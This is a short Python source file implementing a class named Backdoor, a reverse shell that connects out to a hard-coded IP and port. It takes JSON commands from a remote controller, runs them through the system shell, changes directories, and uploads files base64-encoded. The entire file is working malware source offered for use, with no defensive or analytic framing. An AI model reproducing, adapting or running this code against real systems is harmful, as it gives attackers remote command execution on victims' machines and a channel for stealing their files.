import socket
import subprocess
import json
import os
import base64


class Backdoor:
    def __init__(self, ip, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.s.connect((ip, port))

    def execute(self, commands):
        return subprocess.check_output(commands, shell=True)

    def recv_reliably(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.s.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue

    def send_reliably(self, result):
        json_obj = json.dumps(result.decode())  # result is in byte format so string
        self.s.send(json_obj.encode())

    def change_driectory(self, path):
        os.chdir(path)
        return "The present working directory is changed to " + path

    def send_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def run(self):
        result = ""
        while True:
            commands = self.recv_reliably()
            if commands[0] == "exit":
                self.s.close()
                exit()
            elif commands[0] == "cd" and len(commands) > 1:
                i, c = len(commands) - 2, 2
                while i > 0:
                    commands[1] = commands[1] + " " + commands[c]
                    c += 1
                    i -= 1
                result = self.change_driectory(commands[1])
                result = result.encode()
            elif commands[0] == "download":
                result = self.send_file(commands[1])
            else:
                result = self.execute(commands)
            self.send_reliably(result)  # here result is in byte format as subprocess returns in byte format


my_backdoor = Backdoor("192.168.43.13", 8080)
my_backdoor.run()  # To run the program
